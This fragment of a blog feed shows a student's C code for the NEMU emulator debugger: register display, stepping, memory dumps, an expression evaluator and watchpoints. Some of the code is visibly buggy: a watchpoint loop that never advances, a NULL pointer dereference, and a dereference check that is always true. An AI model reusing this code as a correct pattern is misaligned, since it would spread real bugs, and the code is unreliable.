class="type">static</span> <span class="type">int</span> <span class="title function_">cmd_info</span><span class="params">(<span class="type">char</span> *args)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="number">0</span> == <span class="built_in">strncmp</span>(<span class="string">&quot;r&quot;</span>, args, <span class="number">1</span>)) &#123;</span><br><span class="line">    isa_reg_display();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">isa_reg_display</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31m%s:0x%x\t\033[0m &quot;</span>, regsl[i], cpu.gpr[i]._32);</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">3</span>) <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;33m\n%s:0x%x\n\033[0m&quot;</span>, <span class="string">&quot;pc&quot;</span>, cpu.pc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="si-N"><a href="#si-N" class="headerlink" title="si N"></a>si N</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">cmd_si</span><span class="params">(<span class="type">char</span> *args)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="literal">NULL</span> != args) &#123;</span><br><span class="line">    cpu_exec(strtoul(args, <span class="literal">NULL</span>, <span class="number">10</span>));</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    cpu_exec(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="x-N-EXPR"><a href="#x-N-EXPR" class="headerlink" title="x N EXPR"></a>x N EXPR</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">cmd_x</span><span class="params">(<span class="type">char</span> *args)</span> &#123;</span><br><span class="line">  <span class="type">int</span> times = atoi(strtok(<span class="literal">NULL</span>, <span class="string">&quot; &quot;</span>));</span><br><span class="line">  <span class="type">vaddr_t</span> address = (<span class="type">vaddr_t</span>)strtoul(strtok(<span class="literal">NULL</span>, <span class="string">&quot; &quot;</span>), <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; times; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> == i % <span class="number">4</span>)</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34m%08x: \033[0m&quot;</span>, address);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%08x  &quot;</span>, vaddr_read(address, <span class="number">4</span>));</span><br><span class="line">    address += <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> == (i+<span class="number">1</span>) % <span class="number">4</span>)<span class="comment">//</span></span><br><span class="line">      <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(times%<span class="number">4</span>)</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="p-"><a href="#p-" class="headerlink" title="p "></a>p </h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    <span class="comment">/* <span class="doctag">TODO:</span> Add more token types */</span></span><br><span class="line">    TK_NOTYPE = <span class="number">256</span>,</span><br><span class="line">    TK_EQ = <span class="number">1</span>,</span><br><span class="line">    TK_DEC = <span class="number">2</span>,</span><br><span class="line">    TK_ADD = <span class="number">3</span>,</span><br><span class="line">    TK_SUB = <span class="number">4</span>,</span><br><span class="line">    TK_MUL = <span class="number">5</span>,</span><br><span class="line">    TK_DIV = <span class="number">6</span>,</span><br><span class="line">    TK_BRAL = <span class="number">7</span>,</span><br><span class="line">    TK_BRAR = <span class="number">8</span>,</span><br><span class="line">    TK_DEREF = <span class="number">9</span>,</span><br><span class="line">    TK_HEX = <span class="number">10</span>,</span><br><span class="line">    TK_REG=<span class="number">11</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">rule</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> *regex;</span><br><span class="line">    <span class="type">int</span> token_type;</span><br><span class="line">&#125; rules[] = &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* <span class="doctag">TODO:</span> Add more rules.</span></span><br><span class="line"><span class="comment">     * Pay attention to the precedence level of different rules.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    &#123;<span class="string">&quot;0[xX][0-9a-fA-F]+&quot;</span>, TK_HEX&#125;,<span class="comment">//0x0</span></span><br><span class="line">    &#123;<span class="string">&quot;[0-9]+&quot;</span>, TK_DEC&#125;, &#123;<span class="string">&quot; +&quot;</span>, TK_NOTYPE&#125;,  <span class="comment">// spaces</span></span><br><span class="line">    &#123;<span class="string">&quot;\\+&quot;</span>, TK_ADD&#125;,  <span class="comment">// plus/c/</span></span><br><span class="line">    &#123;<span class="string">&quot;-&quot;</span>, TK_SUB&#125;,      &#123;<span class="string">&quot;\\*&quot;</span>, TK_MUL&#125;,   &#123;<span class="string">&quot;/&quot;</span>, TK_DIV&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;\\(&quot;</span>, TK_BRAL&#125;,   &#123;<span class="string">&quot;\\)&quot;</span>, TK_BRAR&#125;,  &#123;<span class="string">&quot;==&quot;</span>, TK_EQ&#125;,  <span class="comment">// equal</span></span><br><span class="line">    &#123;<span class="string">&quot;\\$[a-z]+&quot;</span>, TK_REG&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* <span class="doctag">TODO:</span> Now a new token is recognized with rules[i]. Add codes</span></span><br><span class="line"><span class="comment">                 * to record the token in the array `tokens&#x27;. For certain types</span></span><br><span class="line"><span class="comment">                 * of tokens, some extra actions should be performed.</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (rules[i].token_type) &#123;</span><br><span class="line">    <span class="keyword">case</span> TK_NOTYPE:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> TK_EQ:</span><br><span class="line">    <span class="keyword">case</span> TK_DEC:</span><br><span class="line">    <span class="keyword">case</span> TK_ADD:</span><br><span class="line">    <span class="keyword">case</span> TK_SUB:</span><br><span class="line">    <span class="keyword">case</span> TK_MUL:</span><br><span class="line">    <span class="keyword">case</span> TK_DIV:</span><br><span class="line">    <span class="keyword">case</span> TK_BRAL:</span><br><span class="line">    <span class="keyword">case</span> TK_BRAR:</span><br><span class="line">    <span class="keyword">case</span> TK_HEX:</span><br><span class="line">    <span class="keyword">case</span> TK_REG:</span><br><span class="line">        tokens[nr_token].type = rules[i].token_type;</span><br><span class="line">        <span class="built_in">strncpy</span>(tokens[nr_token].str, substr_start, substr_len);</span><br><span class="line">        tokens[nr_token].str[substr_len] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        nr_token++;</span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">check_parentheses</span><span class="params">(<span class="type">int</span> start, <span class="type">int</span> end)</span> &#123;</span><br><span class="line">    <span class="type">int</span> bracket = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (tokens[start].type == TK_BRAL &amp;&amp; tokens[end].type == TK_BRAR) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = start; i &lt;= end; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (tokens[i].type == TK_BRAL) &#123;</span><br><span class="line">                bracket++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (tokens[i].type == TK_BRAR) &#123;</span><br><span class="line">                bracket--;</span><br><span class="line">                <span class="keyword">if</span> (i != end &amp;&amp; <span class="number">0</span> == bracket) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> == bracket) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">check_exp_is_valid</span><span class="params">(<span class="type">int</span> start,<span class="type">int</span> end)</span> &#123;</span><br><span class="line">    <span class="type">int</span> bracket = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = start; i &lt;= end; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (tokens[i].type == TK_BRAL) &#123;</span><br><span class="line">            bracket++;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (tokens[i].type == TK_BRAR) &#123;</span><br><span class="line">            bracket--;</span><br><span class="line">            <span class="keyword">if</span> (bracket &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">principal_operator</span><span class="params">(<span class="type">int</span> start,<span class="type">int</span> end)</span> &#123;</span><br><span class="line">    <span class="type">int</span> bracket=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> operator= <span class="number">0</span>;</span><br><span class="line">    <span class="type">bool</span> is_add_or_sub=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=start; i&lt;=end; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (tokens[i].type == TK_BRAL) &#123;</span><br><span class="line">            bracket++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(tokens[i].type==TK_BRAR)&#123;</span><br><span class="line">            bracket--;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span>==bracket) &#123;</span><br><span class="line">            <span class="keyword">if</span> (tokens[i].type == TK_ADD || tokens[i].type == TK_SUB) &#123;</span><br><span class="line">                operator=i;</span><br><span class="line">                is_add_or_sub=<span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="literal">false</span> == is_add_or_sub &amp;&amp;</span><br><span class="line">                       (tokens[i].type == TK_DIV || tokens[i].type == TK_MUL||tokens[i].type ==TK_DEREF||tokens[i].type==TK_REG)) &#123;<span class="comment">//</span></span><br><span class="line">                operator=i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> operator;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">bool</span> answer_valid=<span class="literal">true</span>;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">static</span> <span class="type">int32_t</span> <span class="title function_">eval</span><span class="params">(<span class="type">int</span> start, <span class="type">int</span> end)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (start == end) &#123;</span><br><span class="line">        <span class="keyword">if</span>(tokens[start].type==TK_DEC)</span><br><span class="line">            <span class="keyword">return</span> atoi(tokens[start].str);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(tokens[start].type==TK_HEX)</span><br><span class="line">            <span class="keyword">return</span> strtol(tokens[start].str,<span class="literal">NULL</span>,<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (tokens[start].type==TK_REG) &#123;</span><br><span class="line">           <span class="type">int</span> res= isa_reg_str2val(tokens[start].str,&amp;answer_valid);</span><br><span class="line">           <span class="keyword">if</span> (!answer_valid) &#123;</span><br><span class="line">               <span class="built_in">printf</span>(<span class="string">&quot;reg exp error&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="literal">true</span> == check_parentheses(start, end)) &#123;</span><br><span class="line">        <span class="keyword">return</span> eval(start+<span class="number">1</span>,end<span class="number">-1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (check_exp_is_valid(start,end)==<span class="literal">false</span>) &#123;<span class="comment">//check_parenthesesfalse</span></span><br><span class="line">            answer_valid=<span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> operator=principal_operator(start, end);</span><br><span class="line">        <span class="keyword">if</span> (tokens[operator].type==TK_DEREF) &#123;</span><br><span class="line">            <span class="keyword">return</span> vaddr_read(strtoul(tokens[operator+<span class="number">1</span>].str,<span class="literal">NULL</span>,<span class="number">16</span>),<span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="type">int32_t</span> sum1=eval(start,operator<span class="number">-1</span>);</span><br><span class="line">        <span class="type">int32_t</span> sum2=eval(operator+<span class="number">1</span>,end);</span><br><span class="line">        <span class="keyword">switch</span> (tokens[operator].type) &#123;</span><br><span class="line">            <span class="keyword">case</span> TK_ADD:</span><br><span class="line">                <span class="keyword">return</span> sum1 + sum2;</span><br><span class="line">            <span class="keyword">case</span> TK_SUB:</span><br><span class="line">                <span class="keyword">return</span> sum1 - sum2;</span><br><span class="line">            <span class="keyword">case</span> TK_MUL:</span><br><span class="line">                <span class="keyword">return</span> sum1 * sum2;</span><br><span class="line">            <span class="keyword">case</span> TK_DIV:</span><br><span class="line">                <span class="keyword">return</span> sum1 / sum2;</span><br><span class="line">          &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int32_t</span> <span class="title function_">expr</span><span class="params">(<span class="type">char</span> *e, <span class="type">bool</span> *success)</span> &#123;</span><br><span class="line">    answer_valid=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (!make_token(e)) &#123;</span><br><span class="line">        *success = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;=nr_token<span class="number">-1</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (tokens[i].type == TK_MUL &amp;&amp;</span><br><span class="line">            (i == <span class="number">0</span> ||</span><br><span class="line">             (tokens[i - <span class="number">1</span>].type != TK_DEC || tokens[i - <span class="number">1</span>].type != TK_BRAL ||</span><br><span class="line">              tokens[i - <span class="number">1</span>].type != TK_HEX))) &#123;</span><br><span class="line">                tokens[i].type =TK_DEREF;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* <span class="doctag">TODO:</span> Insert codes to evaluate the expression. */</span></span><br><span class="line">    <span class="type">int32_t</span> answer=eval(<span class="number">0</span>,nr_token<span class="number">-1</span>);</span><br><span class="line">    *success=answer_valid;</span><br><span class="line">    <span class="keyword">return</span> answer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">cmd_p</span><span class="params">(<span class="type">char</span> *args)</span> &#123;</span><br><span class="line">    <span class="type">bool</span> flag=<span class="literal">true</span>;</span><br><span class="line">    <span class="type">int32_t</span> answer = expr(args, &amp;flag);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">false</span>==flag) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Error expression&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s: %d 0x%x\n&quot;</span>,args,answer,answer);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">watchpoint</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> NO;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">watchpoint</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* <span class="doctag">TODO:</span> Add more members if necessary */</span></span><br><span class="line">  <span class="type">sword_t</span> value;</span><br><span class="line">  <span class="type">char</span> expr[<span class="number">32</span>];</span><br><span class="line">&#125; WP;</span><br><span class="line">WP* <span class="title function_">new_wp</span><span class="params">(<span class="type">int32_t</span> value,<span class="type">char</span> *expr)</span>; </span><br><span class="line"><span class="type">void</span> <span class="title function_">free_wp</span><span class="params">(WP *wp)</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">check_wp</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">dispaly_wp</span><span class="params">()</span>;</span><br><span class="line">WP* <span class="title function_">get_wp</span><span class="params">(<span class="type">char</span>* s)</span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">init_wp_pool</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NR_WP; i ++) &#123;</span><br><span class="line">    wp_pool[i].NO = i;</span><br><span class="line">    wp_pool[i].next = &amp;wp_pool[i + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">memset</span>(wp_pool[i].expr, <span class="number">0</span>, <span class="number">32</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  wp_pool[NR_WP - <span class="number">1</span>].next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  head = <span class="literal">NULL</span>;</span><br><span class="line">  free_ = wp_pool;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* <span class="doctag">TODO:</span> Implement the functionality of watchpoint */</span></span><br><span class="line">WP* <span class="title function_">new_wp</span><span class="params">(<span class="type">int32_t</span> value,<span class="type">char</span> *expr)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span>==free_) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Dont hava free watch pointer&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    WP* temp = free_;</span><br><span class="line">    free_=free_-&gt;next;</span><br><span class="line">    temp-&gt;next = head;</span><br><span class="line">    head = temp;</span><br><span class="line">    head-&gt;value=value;</span><br><span class="line">    <span class="built_in">memcpy</span>(head-&gt;expr,expr,<span class="built_in">strlen</span>(expr));</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">free_wp</span><span class="params">(WP* wp)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!wp) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;dont have this watch pointer&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (wp==head) &#123;</span><br><span class="line">        head =head-&gt;next;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      WP *temp=head;</span><br><span class="line">     <span class="keyword">while</span> (temp !=<span class="literal">NULL</span> &amp;&amp;temp-&gt;next!=wp) &#123;</span><br><span class="line">      temp=temp-&gt;next;</span><br><span class="line">     &#125;</span><br><span class="line">     temp-&gt;next=temp-&gt;next-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    wp-&gt;next=free_;</span><br><span class="line">    free_=wp;</span><br><span class="line">    wp-&gt;value = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(wp-&gt;expr, <span class="number">0</span>, <span class="number">32</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">check_wp</span><span class="params">()</span> &#123;</span><br><span class="line">    WP* temp=head;</span><br><span class="line">    <span class="type">bool</span> equal=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">while</span> (temp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="type">word_t</span> new_value=expr(temp-&gt;expr,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span>(new_value!=temp-&gt;value) &#123; </span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;Num:%d  Expr:%s  at:%x\n&quot;</span>,temp-&gt;NO,temp-&gt;expr,temp-&gt;value);</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;old value = 0x%x\nnew value = 0x%x\n&quot;</span>,temp-&gt;value,new_value);</span><br><span class="line">          equal = <span class="literal">false</span>;</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        &#125; </span><br><span class="line">        temp=temp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> equal;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">dispaly_wp</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span>==head) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;No watchpoints.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    WP* temp = head;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Num\tWhat\t&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> (temp!=<span class="literal">NULL</span>) &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%d\t0x%x\t\n&quot;</span>,temp-&gt;NO,temp-&gt;value);</span><br><span class="line">          temp=temp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">WP* <span class="title function_">get_wp</span><span class="params">(<span class="type">char</span>* s)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (wp_pool + atoi(s));  <span class="comment">// wp_poolWP*+n=(char *)wp_pool+sizeof(WP)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">cmd_w</span><span class="params">(<span class="type">char</span> *args)</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEBUG</span></span><br><span class="line">    <span class="type">bool</span> flag;</span><br><span class="line">    WP* temp= new_wp(expr(args,&amp;flag),args);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">false</span> == flag) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Error expression in watch&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;watch pointer at 0x%x\n&quot;</span>, temp-&gt;value);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;NOT ON DEBUG PATTERN&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>cpu-exec.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEBUG</span></span><br><span class="line">    asm_print(this_pc, seq_pc - this_pc, n &lt; MAX_INSTR_TO_PRINT);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* <span class="doctag">TODO:</span> check watchpoints here. */</span></span><br><span class="line">    <span class="keyword">if</span> (check_wp()) &#123;</span><br><span class="line">     nemu_state.state=NEMU_STOP; </span><br><span class="line">     <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><h3 id="info-w"><a href="#info-w" class="headerlink" title="info w"></a>info w</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">cmd_info</span><span class="params">(<span class="type">char</span> *args)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="number">0</span> == <span class="built_in">strncmp</span>(<span class="string">&quot;r&quot;</span>, args, <span class="number">1</span>)) &#123;</span><br><span class="line">    isa_reg_display();</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="keyword">if</span> (<span class="number">0</span> == <span class="built_in">strncmp</span>(<span class="string">&quot;w&quot;</span>, args, <span class="number">1</span>)) &#123;</span><br><span class="line">    dispaly_wp();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="d-NUM"><a href="#d-NUM" class="headerlink" title="d NUM"></a>d NUM</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">cmd_d</span><span class="params">(<span class="type">char</span> *args)</span> &#123;</span><br><span class="line">  WP * temp=get_wp(args);</span><br><span class="line">  free_wp(temp);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="command"><a href="#command" class="headerlink" title="command"></a>command</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">char</span> *name;</span><br><span class="line">  <span class="type">char</span> *description;</span><br><span class="line">  <span class="type">int</span> (*handler)(<span class="type">char</span> *);</span><br><span class="line">&#125; cmd_table[] = &#123;</span><br><span class="line">    &#123;<span class="string">&quot;help&quot;</span>, <span class="string">&quot;Display informations about all supported commands&quot;</span>, cmd_help&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;c&quot;</span>, <span class="string">&quot;Continue the execution of the program&quot;</span>, cmd_c&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;q&quot;</span>, <span class="string">&quot;Exit NEMU&quot;</span>, cmd_q&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;si&quot;</span>, <span class="string">&quot;Single Instruction&quot;</span>, cmd_si&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;info&quot;</span>, <span class="string">&quot;info reg or watch&quot;</span>, cmd_info&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;x&quot;</span>, <span class="string">&quot;show memcory info&quot;</span>, cmd_x&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;p&quot;</span>, <span class="string">&quot;pppp&quot;</span>, cmd_p&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;watch&quot;</span>, <span class="string">&quot;watch a point&quot;</span>, cmd_w&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;d&quot;</span>,<span class="string">&quot;delete a watch pointer&quot;</span>,cmd_d&#125;</span><br><span class="line">    <span class="comment">/* <span class="doctag">TODO:</span> Add more commands */</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> NEMU </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NJU ICS4 Linklab</title>
      <link href="/2023/05/08/ics4-linklab/"/>
      <url>/2023/05/08/ics4-linklab/</url>
      
